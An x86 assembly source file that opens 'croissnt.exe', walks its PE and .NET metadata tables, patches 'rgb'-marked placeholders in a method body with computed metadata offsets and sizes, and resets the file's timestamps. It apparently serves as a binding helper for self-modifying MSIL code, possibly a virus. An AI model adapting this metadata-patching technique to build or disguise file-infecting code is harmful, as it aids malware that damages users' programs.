.386
.model  flat

extern  CreateFileA:proc
extern  CreateFileMappingA:proc
extern  MapViewOfFile:proc
extern  GetFileTime:proc
extern  FileTimeToDosDateTime:proc
extern  DosDateTimeToFileTime:proc
extern  SetFileTime:proc
extern  UnmapViewOfFile:proc
extern  CloseHandle:proc
extern  WriteFile:proc
extern  ExitProcess:proc

.data
include bind.inc

fn              db      "croissnt.exe", 0

status          dd      0                       ;stattbl is bound to status - do not move
stattbl         dd      offset bad_open, offset bad_map, offset bad_flags, offset complete

bad_open        db      "Can't open file", 0
bad_map         db      "Can't map file", 0
bad_flags       db      "Unsupported heap flags", 0
complete        db      "Done", 0

vartbl          dd      offset v_sizestrings            ;variable 0
                dd      offset v_allocsize              ;variable 1
                dd      offset v_sizecode               ;variable 2
                dd      offset v_rvacode                ;variable 3
                dd      offset v_rvastrings             ;variable 4
                dd      offset v_prevstrsize            ;variable 5
                dd      offset v_pprevstrsize           ;variable 6
                dd      offset v_sizeschema             ;variable 7
                dd      offset v_numtyperefs            ;variable 8
                dd      offset v_nummemberrefs          ;variable 9
                dd      offset v_rvatyperefs            ;variable 10
                dd      offset v_sizetyperefs           ;variable 11
                dd      offset v_rvamemberrefs          ;variable 12
                dd      offset v_sizememberrefs         ;variable 13
                dd      offset v_prevmrefsize           ;variable 14
                dd      offset v_pprevmrefsize          ;variable 15
                dd      offset v_prevblobsize           ;variable 16
                dd      offset v_pprevblobsize          ;variable 17
                dd      offset v_sizeblob               ;variable 18
                dd      offset v_rvablob                ;variable 19
                dd      offset v_prevnumtyperefs        ;variable 20
                dd      offset v_pprevnumtyperefs       ;variable 21
                dd      offset v_prevblobsize           ;variable 22 (duplicated 16)
                dd      offset v_pprevblobsize          ;variable 23 (duplicated 17)
                dd      offset v_sizelocals             ;variable 24
                dd      offset v_numlocals              ;variable 25
                dd      offset v_rvalocals              ;variable 26
                dd      offset v_sizestack              ;variable 27
                dd      offset v_pprevcode              ;variable 28
                dd      offset v_pprevstrings           ;variable 29
                dd      offset v_pprevtyperefs          ;variable 30
                dd      offset v_pprevmemberrefs        ;variable 31
                dd      offset v_pprevblob              ;variable 32
                dd      offset v_prevlocals             ;variable 33
                dd      offset v_pprevlocals            ;variable 34

rvaschema       dd      ?                       ;3 bound pairs - do not reorder
sizeschema      dd      ?
rvastrings      dd      ?
sizestrings     dd      ?
rvablob         dd      ?
sizeblob        dd      ?

skip1           dd      ?
skip2           dd      ?
skip3           dd      ?

numtyperefs     dd      ?
sizetyperefs    dd      ?
nummemberrefs   dd      ?
sizememberrefs  dd      ?
rvatyperefs     dd      ?
rvacode         dd      ?
codebase        dd      ?
sizestack       dd      ?
sizecode        dd      ?
rvamemberrefs   dd      ?
sizelocals      dd      ?
numlocals       dd      ?
rvalocals       dd      ?
prevstrsize     dd      ?
prevmrefsize    dd      ?
prevblobsize    dd      ?
prevnumtyperefs dd      ?
prevcode        dd      ?
prevstrings     dd      ?
prevtyperefs    dd      ?
prevmemberrefs  dd      ?
prevblob        dd      ?
prevlocals      dd      ?

.code
code_begin      label   near
        xor     ebx, ebx
        push    ebx
        push    ebx
        push    OPEN_EXISTING
        push    ebx
        push    ebx
        push    GENERIC_READ or GENERIC_WRITE
        push    offset fn
        call    CreateFileA
        test    eax, eax
        je      code_exit
        inc     byte ptr ds:[offset status]
        push    eax
        push    ebx
        push    ebx
        push    ebx
        push    PAGE_READWRITE
        push    ebx
        push    eax
        call    CreateFileMappingA
        test    eax, eax
        je      close_file
        inc     byte ptr ds:[offset status]
        push    eax
        push    ebx
        push    ebx
        push    ebx
        push    FILE_MAP_WRITE
        push    eax
        call    MapViewOfFile
        push    eax
        xchg    ebp, eax
        mov     ebx, dword ptr [ebp + mzhdr.mzlfanew]
        add     ebx, ebp
        xor     eax, eax
        imul    ax, word ptr [ebx + pehdr.pecoff.pesectcount], size pesect
        add     ax, word ptr [ebx + pehdr.pecoff.peopthdrsize]
        lea     edi, dword ptr [ebx + eax + size pecoff + 4]
        mov     eax, dword ptr [ebx + pehdr.pecom]
        call    rva2raw

        ;parse COR20 header

        mov     eax, dword ptr [ebp + eax + IMAGE_COR20_HEADER.CORMetaData]
        call    rva2raw
        add     eax, ebp
        xchg    ebx, eax

        ;parse MetaData root

        mov     eax, dword ptr [ebx + STORAGESIGNATURE.SIGiVersionString]
        lea     esi, dword ptr [ebx + eax + size STORAGESIGNATURE + size STORAGEHEADER]
        movzx   ecx, word ptr [esi + STORAGEHEADER.STGiStreams - size STORAGEHEADER]
        mov     edx, offset rvaschema
        fninit
        test    byte ptr [esi + STORAGEHEADER.STGfFlags - size STORAGEHEADER], STGHDR_EXTRADATA
        je      find_streams
        lods    dword ptr [esi]
        add     esi, eax

find_streams    label   near
        fld     qword ptr [esi]
        lods    dword ptr [esi]
        lods    dword ptr [esi]
        xor     eax, eax
        cmp     dword ptr [esi], '~#'
        je      save_stream
        inc     eax
        cmp     dword ptr [esi], 'rtS#'                 ;#Strings
        je      save_stream
        inc     eax
        cmp     dword ptr [esi], 'olB#'                 ;#Blob
        jne     free_stream

save_stream     label   near
        fst     qword ptr [eax * 8 + edx]

free_stream     label   near
        ffree

skip_stream     label   near
        lods    byte ptr [esi]
        test    al, al
        jne     skip_stream
        add     esi, 3
        and     esi, -4
        loop    find_streams

        ;parse #~ stream

        mov     esi, dword ptr [edx]
        lea     esi, dword ptr [esi + ebx + size STRSCHEMA]
        mov     al, byte ptr [esi + STRSCHEMA.SCHHeapSizes - size STRSCHEMA]
        test    al, HEAP_BLOB_4 or HEAP_GUID_4 or HEAP_STRING_4
        jne     unmap_file                              ;too much effort ;)
        inc     byte ptr ds:[offset status]
        push    ebx
        push    ebp
        push    edi
        mov     ebx, dword ptr [esi + STRSCHEMA.SCHValid - size STRSCHEMA]
        mov     edi, dword ptr [esi + STRSCHEMA.SCHValid - size STRSCHEMA + 4]
        test    al, HEAP_PERSIST
        je      skip_persist
        lods    dword ptr [esi]

skip_persist    label   near
        lods    dword ptr [esi]                         ;Modules
        lods    dword ptr [esi]
        mov     dword ptr [edx + offset numtyperefs - offset rvaschema], eax
        imul    ecx, eax, 6                             ;size TypeRefs
        mov     dword ptr [edx + offset sizetyperefs - offset rvaschema], ecx

        ;find Methods

        push    5
        pop     ecx
        mov     ebp, (2 shl 10h) + (6 shl 0ch) + (2 shl 8) + (14 shl 4) + 6
        call    find_row
        mov     dword ptr [edx + offset skip1 - offset rvaschema], ebp

        ;find Memberrefs

        mov     cl, 4
        mov     ebp, (4 shl 0ch) + (6 shl 8) + (2 shl 4) + 14
        call    find_row
        mov     dword ptr [edx + offset skip2 - offset rvaschema], ebp
        mov     dword ptr [edx + offset nummemberrefs - offset rvaschema], eax
        imul    ecx, eax, 6                             ;size MemberRefs
        mov     dword ptr [edx + offset sizememberrefs - offset rvaschema], ecx

        ;find StandAloneSigs

        push    7
        pop     ecx
        mov     ebp, (6 shl 18h) + (8 shl 14h) + (6 shl 10h) + (4 shl 0ch) + (6 shl 8) + (6 shl 4) + 6
        call    find_row
        mov     dword ptr [edx + offset skip3 - offset rvaschema], ebp

        ;skip remaining entries

        push    19h
        pop     ecx
        call    find_row
        pop     edi
        pop     ebp
        pop     ebx

        ;skip Module

        add     esi, 6                                  ;size Module - 4
        call    raw2rva
        mov     dword ptr [edx + offset rvatyperefs - offset rvaschema], eax
        add     esi, dword ptr [edx + offset skip1 - offset rvaschema]
        push    0ch
        pop     eax
        add     eax, dword ptr [esi]
        mov     dword ptr [edx + offset rvacode - offset rvaschema], eax
        call    rva2raw
        add     eax, ebp
        mov     dword ptr [edx + offset codebase - offset rvaschema], eax
        push    eax
        movzx   ecx, word ptr [eax - 0ah]
        mov     dword ptr [edx + offset sizestack - offset rvaschema], ecx
        mov     eax, dword ptr [eax - 8]
        mov     dword ptr [edx + offset sizecode - offset rvaschema], eax
        push    eax
        add     esi, dword ptr [edx + offset skip2 - offset rvaschema]
        call    raw2rva
        mov     dword ptr [edx + offset rvamemberrefs - offset rvaschema], eax
        add     esi, dword ptr [edx + offset skip3 - offset rvaschema]
        movzx   ecx, word ptr [esi]
        lea     esi, dword ptr [ecx + ebx]
        add     esi, dword ptr [edx + offset rvablob - offset rvaschema]
        xor     eax, eax
        lods    byte ptr [esi]
        test    al, al
        jns     store_locsize
        and     al, 3fh
        shl     eax, 8
        lods    byte ptr [esi]
        dec     eax
        inc     ecx

store_locsize   label   near
        dec     eax
        dec     eax
        mov     dword ptr [edx + offset sizelocals - offset rvaschema], eax
        lods    byte ptr [esi]
        lods    byte ptr [esi]
        test    al, al
        jns     store_locnum
        and     al, 3fh
        shl     eax, 8
        lods    byte ptr [esi]
        inc     ecx

store_locnum    label   near
        mov     dword ptr [edx + offset numlocals - offset rvaschema], eax
        add     ecx, 3
        mov     dword ptr [edx + offset rvalocals - offset rvaschema], ecx
        mov     esi, ebx
        call    raw2rva
        add     dword ptr [edx], eax
        add     dword ptr [edx + offset rvastrings - offset rvaschema], eax
        add     dword ptr [edx + offset rvablob - offset rvaschema], eax
        pop     ecx
        pop     edi

replace_init    label   near
        mov     al, 'r'

replace_vars    label   near
        repne   scas byte ptr [edi]
        jne     set_time
        cmp     word ptr [edi], 'bg'
        jne     replace_vars
        movzx   eax, byte ptr [edi + 2]
        call    dword ptr [eax * 4 + edx + offset vartbl - offset rvaschema]
        jmp     replace_init

set_time        label   near
        push    eax
        push    eax
        mov     esi, esp
        push    eax
        push    eax
        mov     edi, esp
        push    eax
        push    eax
        mov     ebp, esp
        push    esp
        push    edi
        push    esi
        push    dword ptr [esp + 2ch]
        call    GetFileTime
        push    eax
        mov     eax, esp
        push    eax
        push    esp
        push    eax
        push    ebp
        call    FileTimeToDosDateTime
        and     byte ptr [esp], 0e0h
        push    ebp
        push    dword ptr [esp + 4]
        push    dword ptr [esp + 0ch]
        call    DosDateTimeToFileTime
        push    ebp
        push    edi
        push    esi
        push    dword ptr [esp + 34h]
        call    SetFileTime
        add     esp, 20h

unmap_file      label   near
        call    UnmapViewOfFile
        call    CloseHandle

close_file      label   near
        call    CloseHandle

code_exit       label   near
        mov     esi, offset status
        lods    dword ptr [esi]
        lea     esi, dword ptr [eax * 4 + esi]
        lods    dword ptr [esi]
        mov     esi, eax
        xchg    edi, eax
        xor     eax, eax
        or      ecx, -1
        repne   scas byte ptr [edi]
        dec     edi
        sub     edi, esi
        push    eax
        push    eax
        push    esp
        push    edi
        push    esi
        push    STD_OUTPUT_HANDLE
        call    WriteFile
        call    ExitProcess

rva2raw         proc    near
        push    edi

rva2raw_loop    label   near
        sub     edi, size pesect
        cmp     dword ptr [edi + pesect.sectvirtaddr], eax
        jnbe    rva2raw_loop
        sub     eax, dword ptr [edi + pesect.sectvirtaddr]
        add     eax, dword ptr [edi + pesect.sectrawaddr]
        pop     edi
        ret
rva2raw         endp

find_row        proc    near
        push    edx
        mov     edx, ebp
        xor     ebp, ebp

find_rowloop    label   near
        test    bl, 2
        je      skip_row
        push    edx
        and     edx, 0fh
        mul     edx
        add     ebp, eax
        pop     edx
        lods    dword ptr [esi]

skip_row        label   near
        shr     edx, 4
        shr     edi, 1
        rcr     ebx, 1
        loop    find_rowloop
        pop     edx
        ret
find_row        endp

raw2rva         proc    near
        mov     eax, esi
        sub     eax, ebp
        push    edi

raw2rva_loop    label   near
        sub     edi, size pesect
        cmp     dword ptr [edi + pesect.sectrawaddr], eax
        jnbe    raw2rva_loop
        sub     eax, dword ptr [edi + pesect.sectrawaddr]
        add     eax, dword ptr [edi + pesect.sectvirtaddr]
        pop     edi
        ret
raw2rva         endp

v_sizestrings   proc    near
        mov     eax, dword ptr [edx + offset sizestrings - offset rvaschema]
        add     eax, 3                                  ;bytes for align later
        mov     dword ptr [edi - 1], eax
        ret
v_sizestrings   endp

v_allocsize     proc    near
        push    ecx
        imul    eax, dword ptr [edx + offset numtyperefs - offset rvaschema], 6
        imul    ecx, dword ptr [edx + offset nummemberrefs - offset rvaschema], 6
        lea     eax, dword ptr [eax + ecx + 2 + 3]      ;+ size StandAloneSig + bytes for align later
        add     eax, dword ptr [edx + offset sizestrings - offset rvaschema]
        mov     dword ptr [edi - 1], eax
        pop     ecx
        ret
v_allocsize     endp

v_sizecode      proc    near
        mov     eax, dword ptr [edx + offset sizecode - offset rvaschema]
        mov     dword ptr [edi - 1], eax
        ret
v_sizecode      endp

v_rvacode       proc    near
        mov     eax, dword ptr [edx + offset rvacode - offset rvaschema]
        mov     dword ptr [edi - 1], eax
        lea     eax, dword ptr [edi - 1]
        sub     eax, dword ptr [edx + offset codebase - offset rvaschema]
        mov     dword ptr [edx + offset prevcode - offset rvaschema], eax
        ret
v_rvacode       endp

v_rvastrings    proc    near
        mov     eax, dword ptr [edx + offset rvastrings - offset rvaschema]
        mov     dword ptr [edi - 1], eax
        lea     eax, dword ptr [edi - 1]
        sub     eax, dword ptr [edx + offset codebase - offset rvaschema]
        mov     dword ptr [edx + offset prevstrings - offset rvaschema], eax
        ret
v_rvastrings    endp

v_prevstrsize   proc    near
        xor     eax, eax
        mov     dword ptr [edi - 1], eax
        lea     eax, dword ptr [edi - 1]
        sub     eax, dword ptr [edx + offset codebase - offset rvaschema]
        mov     dword ptr [edx + offset prevstrsize - offset rvaschema], eax
        ret
v_prevstrsize   endp

v_pprevstrsize  proc    near
        mov     eax, dword ptr [edx + offset prevstrsize - offset rvaschema]
        mov     dword ptr [edi - 1], eax
        ret
v_pprevstrsize  endp

v_sizeschema    proc    near
        push    ecx
        imul    eax, dword ptr [edx + offset numtyperefs - offset rvaschema], 6
        imul    ecx, dword ptr [edx + offset nummemberrefs - offset rvaschema], 6
        lea     eax, dword ptr [eax + ecx + 2 + 3]      ;+ size StandAloneSig + bytes for align later
        mov     dword ptr [edi - 1], eax
        pop     ecx
        ret
v_sizeschema    endp

v_numtyperefs   proc    near
        mov     eax, dword ptr [edx + offset numtyperefs - offset rvaschema]
        mov     dword ptr [edi - 1], eax
        ret
v_numtyperefs   endp

v_nummemberrefs proc    near
        mov     eax, dword ptr [edx + offset nummemberrefs - offset rvaschema]
        mov     dword ptr [edi - 1], eax
        ret
v_nummemberrefs endp

v_rvatyperefs   proc    near
        mov     eax, dword ptr [edx + offset rvatyperefs - offset rvaschema]
        mov     dword ptr [edi - 1], eax
        lea     eax, dword ptr [edi - 1]
        sub     eax, dword ptr [edx + offset codebase - offset rvaschema]
        mov     dword ptr [edx + offset prevtyperefs - offset rvaschema], eax
        ret
v_rvatyperefs   endp

v_sizetyperefs  proc    near
        mov     eax, dword ptr [edx + offset sizetyperefs - offset rvaschema]
        mov     dword ptr [edi - 1], eax
        ret
v_sizetyperefs  endp

v_rvamemberrefs proc    near
        mov     eax, dword ptr [edx + offset rvamemberrefs - offset rvaschema]
        mov     dword ptr [edi - 1], eax
        lea     eax, dword ptr [edi - 1]
        sub     eax, dword ptr [edx + offset codebase - offset rvaschema]
        mov     dword ptr [edx + offset prevmemberrefs - offset rvaschema], eax
        ret
v_rvamemberrefs endp

v_sizememberrefs        proc    near
        mov     eax, dword ptr [edx + offset sizememberrefs - offset rvaschema]
        mov     dword ptr [edi - 1], eax
        ret
v_sizememberrefs        endp

v_prevmrefsize          proc    near
        xor     eax, eax
        mov     dword ptr [edi - 1], eax
        lea     eax, dword ptr [edi - 1]
        sub     eax, dword ptr [edx + offset codebase - offset rvaschema]
        mov     dword ptr [edx + offset prevmrefsize - offset rvaschema], eax
        ret
v_prevmrefsize          endp

v_pprevmrefsize         proc    near
        mov     eax, dword ptr [edx + offset prevmrefsize - offset rvaschema]
        mov     dword ptr [edi - 1], eax
        ret
v_pprevmrefsize         endp

v_prevblobsize  proc    near
        xor     eax, eax
        mov     dword ptr [edi - 1], eax
        lea     eax, dword ptr [edi - 1]
        sub     eax, dword ptr [edx + offset codebase - offset rvaschema]
        mov     dword ptr [edx + offset prevblobsize - offset rvaschema], eax
        ret
v_prevblobsize  endp

v_pprevblobsize proc    near
        mov     eax, dword ptr [edx + offset prevblobsize - offset rvaschema]
        mov     dword ptr [edi - 1], eax
        ret
v_pprevblobsize endp

v_sizeblob      proc    near
        mov     eax, dword ptr [edx + offset sizeblob - offset rvaschema]
        mov     dword ptr [edi - 1], eax
        ret
v_sizeblob      endp

v_rvablob       proc    near
        mov     eax, dword ptr [edx + offset rvablob - offset rvaschema]
        mov     dword ptr [edi - 1], eax
        lea     eax, dword ptr [edi - 1]
        sub     eax, dword ptr [edx + offset codebase - offset rvaschema]
        mov     dword ptr [edx + offset prevblob - offset rvaschema], eax
        ret
v_rvablob       endp

v_prevnumtyperefs       proc    near
        xor     eax, eax
        mov     dword ptr [edi - 1], eax
        lea     eax, dword ptr [edi - 1]
        sub     eax, dword ptr [edx + offset codebase - offset rvaschema]
        mov     dword ptr [edx + offset prevnumtyperefs - offset rvaschema], eax
        ret
v_prevnumtyperefs       endp

v_pprevnumtyperefs      proc    near
        mov     eax, dword ptr [edx + offset prevnumtyperefs - offset rvaschema]
        mov     dword ptr [edi - 1], eax
        ret
v_pprevnumtyperefs      endp

v_sizelocals    proc    near
        mov     eax, dword ptr [edx + offset sizelocals - offset rvaschema]
        mov     dword ptr [edi - 1], eax
        ret
v_sizelocals    endp

v_numlocals     proc    near
        mov     eax, dword ptr [edx + offset numlocals - offset rvaschema]
        mov     dword ptr [edi - 1], eax
        ret
v_numlocals     endp

v_rvalocals     proc    near
        mov     eax, dword ptr [edx + offset rvalocals - offset rvaschema]
        mov     dword ptr [edi - 1], eax
        ret
v_rvalocals     endp

v_sizestack     proc    near
        mov     eax, dword ptr [edx + offset sizestack - offset rvaschema]
        mov     dword ptr [edi - 1], eax
        ret
v_sizestack     endp

v_pprevcode     proc    near
        mov     eax, dword ptr [edx + offset prevcode - offset rvaschema]
        mov     dword ptr [edi - 1], eax
        ret
v_pprevcode     endp

v_pprevstrings  proc    near
        mov     eax, dword ptr [edx + offset prevstrings - offset rvaschema]
        mov     dword ptr [edi - 1], eax
        ret
v_pprevstrings  endp

v_pprevtyperefs proc    near
        mov     eax, dword ptr [edx + offset prevtyperefs - offset rvaschema]
        mov     dword ptr [edi - 1], eax
        ret
v_pprevtyperefs endp

v_pprevmemberrefs       proc    near
        mov     eax, dword ptr [edx + offset prevmemberrefs - offset rvaschema]
        mov     dword ptr [edi - 1], eax
        ret
v_pprevmemberrefs       endp

v_pprevblob     proc    near
        mov     eax, dword ptr [edx + offset prevblob - offset rvaschema]
        mov     dword ptr [edi - 1], eax
        ret
v_pprevblob     endp

v_prevlocals    proc    near
        xor     eax, eax
        mov     dword ptr [edi - 1], eax
        lea     eax, dword ptr [edi - 1]
        sub     eax, dword ptr [edx + offset codebase - offset rvaschema]
        mov     dword ptr [edx + offset prevlocals - offset rvaschema], eax
        ret
v_prevlocals    endp

v_pprevlocals   proc    near
        mov     eax, dword ptr [edx + offset prevlocals - offset rvaschema]
        mov     dword ptr [edi - 1], eax
        ret
v_pprevlocals   endp
end             code_begin
